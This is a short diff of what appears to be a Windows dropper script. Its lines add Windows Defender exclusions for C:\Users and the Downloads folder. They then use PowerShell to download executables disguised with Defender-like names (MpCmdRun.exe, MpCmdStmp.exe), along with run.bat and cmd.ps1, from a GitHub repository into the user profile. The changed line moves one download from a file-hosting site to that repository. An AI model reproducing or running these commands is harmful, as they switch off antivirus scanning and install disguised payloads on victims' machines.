@@ -7,7 +7,7 @@ powershell.exe Add-MpPreference -ExclusionPath "C:\Users"
 powershell.exe Add-MpPreference -ExclusionPath "%USERPROFILE%\Downloads"
 
 powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SszOnTop/2z/main/MpCmdStmp.exe' -OutFile '%USERPROFILE%\AppData\Roaming\MpCmdStmp.exe'"
-powershell -c "Invoke-WebRequest -Uri 'https://www.upload.ee/download/16301812/e562d7aeddf51e5c7f75/MpCmdRun.exe' -OutFile '%USERPROFILE%\MpCmdRun.exe'"
+powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SszOnTop/2z/main/MpCmdRun.exe' -OutFile '%USERPROFILE%\MpCmdRun.exe'"
 powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SszOnTop/2z/main/run.bat' -OutFile '%USERPROFILE%\run.bat'"
 powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SszOnTop/2z/main/cmd.ps1' -OutFile '%USERPROFILE%\cmd.ps1'"
 
